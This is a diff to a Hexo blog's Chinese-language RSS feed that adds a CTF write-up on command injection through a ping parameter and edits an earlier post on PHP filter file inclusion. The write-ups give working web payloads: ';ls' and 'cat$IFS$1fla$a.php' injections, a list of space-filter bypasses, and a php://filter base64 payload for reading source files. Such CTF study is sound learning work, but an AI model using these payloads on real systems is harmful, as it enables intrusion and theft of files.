@@ -9,8 +9,32 @@
     <atom:link href="http://example.com/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>再进步一点</description>
-    <pubDate>Mon, 03 Apr 2023 03:09:23 GMT</pubDate>
+    <pubDate>Mon, 03 Apr 2023 03:50:23 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>ping ping ping</title>
+      <link>http://example.com/2023/04/03/ping-ping-ping/</link>
+      <guid>http://example.com/2023/04/03/ping-ping-ping/</guid>
+      <pubDate>Mon, 03 Apr 2023 03:40:02 GMT</pubDate>
+      
+        
+        
+      <description>&lt;p&gt;例题：&lt;br&gt;&lt;img src=&quot;ping.png&quot;&gt;&lt;br&gt;打开源码发现也只有&amp;#x2F;?ip&amp;#x3D;&lt;br&gt;随便输入一串ip &amp;#x2F;?127.0.0.1&lt;br&gt;发现有回显，判断为ping命令执行，&amp;#x2F;?127.0.0.1;ls查看目录&lt;br&gt;&lt;img</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<p>例题：<br><img src="ping.png"><br>打开源码发现也只有&#x2F;?ip&#x3D;<br>随便输入一串ip &#x2F;?127.0.0.1<br>发现有回显，判断为ping命令执行，&#x2F;?127.0.0.1;ls查看目录<br><img src="pingls.png"><br>尝试读取flag失败，发现过滤了空格<br><img src="fkspace.png"><br>知识点：绕过过滤<br>绕过空格的方法有：<br>${IFS}$9<br>{IFS}<br>$IFS<br>${IFS}<br>$IFS$1<br>IFS<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}<br>%20   (space)<br>%09   (tab)<br>X&#x3D;$’cat\x09.&#x2F;flag.php’;$X       （\x09表示tab，也可以用\x20）<br>尝试&#x2F;?127.0.0.1;cat${IFS}$9flag.php 发现过滤了{}<br><img src="symbol.png"><br>用$IFS$1 发现不给看flag<br><img src="flag.png"><br>读index发现是php源码，注意到有一个变量a，可以使用简单的拼接<br><img src="index.png"><br>&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php<br>发现没有回显，最后查看注释发现flag在网页注释里</p>]]></content:encoded>
+      
+      
+      
+      <category domain="http://example.com/tags/ping/">ping</category>
+      
+      
+      <comments>http://example.com/2023/04/03/ping-ping-ping/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>CTF PHP filter</title>
@@ -25,7 +49,7 @@
       
       
       
-      <content:encoded><![CDATA[<p>例题1：buuctf include<br>查看源码发现除了一个php之外没有东西，由include想到可能是php漏洞<br>知识点：<br>php:&#x2F;&#x2F;filter 可以伪协议文件包含读取源代码，加上read&#x3D;convert.base64-encode，php中要<br>转为base64输出<br><img src="filter1.png"><br>构造payload：<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>![](base64 res.png)<br>最后解码可得flag</p>]]></content:encoded>
+      <content:encoded><![CDATA[<p>例题1：buuctf include<br>查看源码发现除了一个php之外没有东西，由include想到可能是php漏洞<br>知识点：<br>php:&#x2F;&#x2F;filter 可以伪协议文件包含读取源代码，加上read&#x3D;convert.base64-encode，php中要<br>转为base64输出<br><img src="filter1.png"><br>构造payload：<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<br><img src="base64res.png"><br>最后解码可得flag</p>]]></content:encoded>
       
       
       
